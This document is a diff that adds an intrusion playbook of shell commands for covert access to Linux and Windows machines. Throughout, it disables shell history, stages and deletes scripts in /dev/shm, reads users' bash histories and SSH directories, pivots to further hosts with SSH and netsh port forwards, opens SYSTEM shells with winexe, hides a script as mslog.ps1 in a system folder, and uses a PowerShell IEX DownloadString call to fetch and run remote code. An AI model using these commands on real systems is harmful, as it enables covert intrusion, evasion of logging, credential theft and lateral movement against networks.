@@ -1,0 +1,177 @@
+===============
+-- Linux Box
+===============
+script termscreen.$$
+
+ssh -v -x -M -f -N -o ControlPath=/tmp/hop-1 root@1.1.1.1
+
+ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1 ls -latr /var/account/pacct
+
+ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1
+
+unset HISTFILE HISTFILESIZE HISTSIZE 
+
+scp -o ControlPath=/tmp/hop-1 /cline_##Oct_#/mando.sh root@1.1.1.1:/dev/shm/.a
+source /dev/shm/.a
+rm -f /dev/shm/.a
+
+Ran the following mando commands in script mando.sh
+date; date -u
+ps -elf
+netstat -natup || ss -natup
+ifconfig || ip a
+w
+uname -a
+df -h
+ls -latr /
+ls -latr /tmp
+ls -latr .
+ls -latr ..
+ls -latr /root
+ls -latr /var/log
+find / -type f -mmin -20 | egrep -v '\/sys|\/proc'
+cat /root/.bash_history
+cat /home/*/.bash_history
+cat /root/.viminfo
+cat /home/*/.viminfo
+
+
+cat ./survey.sh | ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1 > survey-<ip>
+
+Ran the following commands in survey.sh script
+cat /etc/*syslog*
+lsmod
+cat /etc/*release*
+servcie --status-all || systemctl status --no-pager
+for user in $(cat /etc/passwd | egrep '/bin/sh|/bin/bash' | cut -d \: -f1); do crontab -u $user -l; done
+cat /etc/crontab
+cat /proc/cpuinfo
+ls -la /etc/cron.*
+ip nei || arp -vn
+route -n
+mount
+cat /etc/rc.local
+if [[ $(lsmod | grep -i table) ]]; then eval "iptables -L"; else echo "No IPTables"; fi
+echo ""
+ls -latr /root/.ssh
+ls -latr /home/*/.ssh
+
+
+Ran the following exit commands in script mando.sh
+ps -elf
+netstat -lptn
+find / -type f -mmin -120 | egrep -v '\/sys|\/proc' 2>/dev/null
+ls -latr /dev/shm
+ls -latr /tmp
+ls -latr /var/log
+ssh -S /tmp/hop-# -O exit root@1.1.1.1
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+2nd LINUX BOX ACCESS COMMANDS
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 10602:2.2.2.2:22
+
+ssh -v -x -M -f -N -o ControlPath=/tmp/hop-2 -p 10602 root@127.0.0.1
+ssh -o ControlPath=/tmp/hop-2 root@127.0.0.1
+unset HISTFILE HISTFILESIZE HISTSIZE
+scp -o ControlPath=/tmp/hop-2 /root/Downloads/mando.sh root@1.1.1.1:/dev/shm/.a
+source /dev/shm/.a
+rm -f /dev/shm/.a
+ 
+ 
+ssh -S /tmp/hop-# -O exit root@127.0.0.1
+
+ 
+===============
+--Windows Box
+===============
+
+script termscreen.$$
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+winexe only:
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 192.168.100.199:445:10.10.100.77:4455
+winexe -U admin3 //127.0.0.1 cmd.exe --system
+^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ssh only:
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 10609:10.10.100.77:22
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -R 8000:127.0.0.1:8000
+
+powershell.exe -nop -exec bypass
+IEX (New-Object Net.Webclient).DownloadString("http://10.10.20.137:8000/mando.ps1")
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+scp -o ControlPath=/tmp/hop-1 ./mando.ps1 root@1.1.1.1:"C:\windows\system32\config\mslog.ps1"
+import-module c:\windows\system32\config\mslog.ps1
+
+
+
+
+date /t && time /t
+tasklist /V
+wmic process get commandline, processid, parentprocessid /format:list
+query session
+netstat -anob
+netsh advfirewall show allprofiles
+net share
+reg query hklm\software\microsoft\windows\currentversion\run
+reg query hklm\software\microsoft\windows\currentversion\runonce
+reg query hklm\software
+reg query hklm\software\wow6432node
+at
+schtasks /query /v /fo list
+dir /o:d /t:w c:\
+dir /o:d /t:w c:\windows\temp
+dir /o:d /t:w c:\windows\
+dir /o:d /t:w c:\windows\system32
+dir /o:d /t:w c:\windows\system32\winevt\logs
+Wevtutil qe security /c:25 /rd:true /f:text (whatever has updated from previous dir)
+auditpol /get /category:*
+wevtutil gt "windows powershell"
+
+ipconfig /all
+powershell.exe -nop -exec bypass
+$tasks = schtasks.exe /query /v /fo csv | ConvertFrom-Csv; $tasks | where-object {$_.'Scheduled Task State' -eq "Enabled"} | select-object TaskName, 'Task To Run'
+
+########################
+# COPY ALL SURVEY INFO #
+########################
+
+Systeminfo
+Net user
+Net localgroup
+Net session
+Net start
+Type %systemroot%\system32\drivers\etc\hosts
+Arp -a
+Route print
+
+
+###################################################
+##IF NEXT TARGET IS WINDOWS USE THIS:
+##################################################
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 192.168.100.199:445:10.10.100.77:48435
+
+netsh interface portproxy add v4tov4 listenport=48435 listenaddress=10.106.0.9 connectport=445 connectaddress=10.106.0.10 protocol=tcp
+netsh interface portproxy show all
+##################################################
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+$$IF NEXT TARGET IS A LINUX BOX USE THIS:
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+ssh -o ControlPath=/tmp/hop-1 -O forward root@1.1.1.1 -L 10602:10.10.100.77:38435
+
+netsh interface portproxy add v4tov4 listenport=38435 listenaddress=10.106.0.9 connectport=22 connectaddress=10.106.0.10 protocol=tcp
+netsh interface portproxy show all
+ssh -v -x -M -f -N -o ControlPath=/tmp/hop-2 -p 10602 root@127.0.0.1
+
+$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+
+
+netsh interface portproxy delete v4tov4 listenport=<> listenaddress=192.168.1.111
+dir /o:d /t:w c:\windows\temp
+dir /o:d /t:w c:\windows\system32\winevt\logs
+Wevtutil qe security /c:25 /rd:true /f:text         #whatever has updated from previous dir
+netstat /anob
+tasklist
+
